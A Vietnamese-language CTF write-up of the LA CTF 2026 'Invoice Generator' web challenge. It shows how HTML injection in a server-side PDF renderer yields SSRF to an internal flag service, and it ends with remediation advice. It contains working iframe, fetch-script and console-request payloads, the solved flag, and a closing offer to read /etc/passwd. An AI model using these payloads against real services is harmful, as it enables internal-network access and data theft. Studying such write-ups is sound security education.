---
layout: single
title: "[Writeup] LA CTF 2026 - Invoice Generator (Web)"
date: 2026-02-10
classes: wide
categories: [LACTF 2026, web]
tags: [lactf, web, xss, ssrf, html-injection, pdf-generation]
---

Chào bạn, đây là bản Writeup chi tiết cho bài **LA CTF Invoice Generator**. Bản hướng dẫn này được thiết kế để một người mới bắt đầu cũng có thể hiểu rõ từ tư duy tiếp cận cho đến kỹ thuật khai thác.

## 1. Phân tích bài toán (Reconnaissance)

Đầu tiên, chúng ta truy cập vào trang web và thấy một biểu mẫu (form) cho phép tạo hóa đơn. Các trường dữ liệu bao gồm:

*   **Customer Name:** Tên khách hàng.
*   **Item Description:** Mô tả món hàng.
*   **Cost ($):** Giá tiền.
*   **Date Purchased:** Ngày mua.

![Invoice Form](/assets/images/lactf/invoice-generator/form.png)

Khi nhấn nút **Generate Invoice PDF**, trình duyệt sẽ gửi một yêu cầu POST chứa dữ liệu JSON tới đường dẫn `/generate-invoice`. Server sau đó trả về một file PDF chứa các thông tin chúng ta vừa nhập.

### Cơ chế hoạt động ngầm (Backend Logic)

Thông thường, các ứng dụng tạo PDF từ Web hoạt động theo luồng:

1.  Nhận dữ liệu từ người dùng.
2.  Đưa dữ liệu vào một bản mẫu (Template) HTML.
3.  Sử dụng một "Headless Browser" (như Puppeteer hoặc Playwright) để mở trang HTML đó và lệnh cho nó "In ra PDF".

## 2. Tìm kiếm lỗ hổng (Vulnerability Research)

### Giả thuyết 1: HTML Injection (Server-Side XSS)

Nếu chúng ta nhập các thẻ HTML như `<b>Hello</b>` vào ô tên khách hàng, liệu PDF sẽ hiện chữ **Hello** in đậm hay hiện nguyên văn cả thẻ? Nếu nó in đậm, nghĩa là server đang tin tưởng dữ liệu người dùng và render HTML đó — đây chính là lỗ hổng **Server-Side XSS**.

### Giả thuyết 2: SSRF (Server-Side Request Forgery)

Trong đề bài (hoặc file cấu hình đi kèm), chúng ta biết có một service nội bộ chạy tại `http://flag:8081/flag`. Chúng ta không thể truy cập trực tiếp link này từ máy tính của mình. Tuy nhiên, nếu "Headless Browser" trên server bị chúng ta điều khiển, nó có thể truy cập được link nội bộ đó.

## 3. Chiến thuật khai thác (Exploitation Strategy)

Mục tiêu của chúng ta là bắt trình duyệt render PDF của server đi lấy nội dung từ `http://flag:8081/flag` và nhúng nó vào file PDF trả về cho mình.

### Bước 1: Thử nghiệm với thẻ `<iframe>`

Thẻ `<iframe>` dùng để nhúng một trang web khác vào trang hiện tại. Chúng ta sẽ nhúng trang chứa flag vào hóa đơn.

**Payload:**

```html
<iframe src="http://flag:8081/flag" width="500" height="200"></iframe>
```

**Thực hiện:** Nhập payload này vào ô **Customer Name**.

### Bước 2: Nâng cấp với JavaScript (Nếu iframe bị chặn)

Nếu thẻ iframe không hiển thị được, chúng ta dùng script để ép server thực hiện yêu cầu lấy dữ liệu (fetch) và in ra màn hình.

**Payload:**

```html
<script>
  fetch('http://flag:8081/flag')
    .then(res => res.text())
    .then(text => document.write('<h1>' + text + '</h1>'))
</script>
```

## 4. Thực thi (Execution)

### Cách làm trực tiếp trên giao diện:

1.  Điền thông tin bất kỳ vào các ô khác.
2.  Tại ô **Customer Name**, dán payload `<iframe>` ở trên vào.
3.  Nhấn **Generate Invoice PDF**.
4.  Mở file PDF được tải về. Bạn sẽ thấy một khung hình chứa nội dung Flag.

![Generated Invoice with Flag](/assets/images/lactf/invoice-generator/flag.png)

> Flag mẫu: `lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}`

### Cách làm chuyên nghiệp (Bypass giới hạn độ dài ký tự):

Nếu giao diện web không cho dán đoạn mã dài, hãy mở **F12 -> Console** và chạy lệnh này để gửi dữ liệu trực tiếp:

```javascript
fetch("/generate-invoice", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    name: "<iframe src='http://flag:8081/flag' width='500' height='200'></iframe>",
    item: "Exploit",
    cost: "0",
    datePurchased: "2026-02-10"
  }),
})
.then(r => r.blob())
.then(blob => {
  const url = window.URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "flag.pdf";
  a.click();
});
```

## 5. Tại sao nó hoạt động? (The "Why")

1.  **Sự tin tưởng mù quáng:** Server lấy input của bạn và nối thẳng vào chuỗi HTML mà không lọc (sanitize).
2.  **SSRF:** Trình duyệt render PDF chạy trên server. Vì nó chạy "bên trong" mạng nội bộ, nó có thể nhìn thấy và lấy được dữ liệu từ `flag:8081` — điều mà người dùng Internet không làm được.
3.  **Render tĩnh:** Khi trình duyệt render xong nội dung (bao gồm cả nội dung trong iframe), nó chụp lại khoảnh khắc đó thành PDF và gửi cho bạn.

## 6. Tổng kết và Bài học (Remediation)

*   **Lỗ hổng:** HTML Injection dẫn đến SSRF.
*   **Cách khắc phục:**
    *   Sử dụng thư viện render an toàn hoặc thực hiện lọc bỏ (Sanitize) các thẻ nguy hiểm như `<script>`, `<iframe>` trước khi đưa vào PDF.
    *   Cấu hình trình duyệt render PDF không được phép truy cập mạng nội bộ.

Hy vọng bản Writeup này giúp bạn hiểu sâu hơn về cách kết hợp giữa XSS và SSRF! Bạn có muốn mình giải thích thêm về cách dùng kỹ thuật này để đọc các file nhạy cảm trên máy chủ như `/etc/passwd` không?
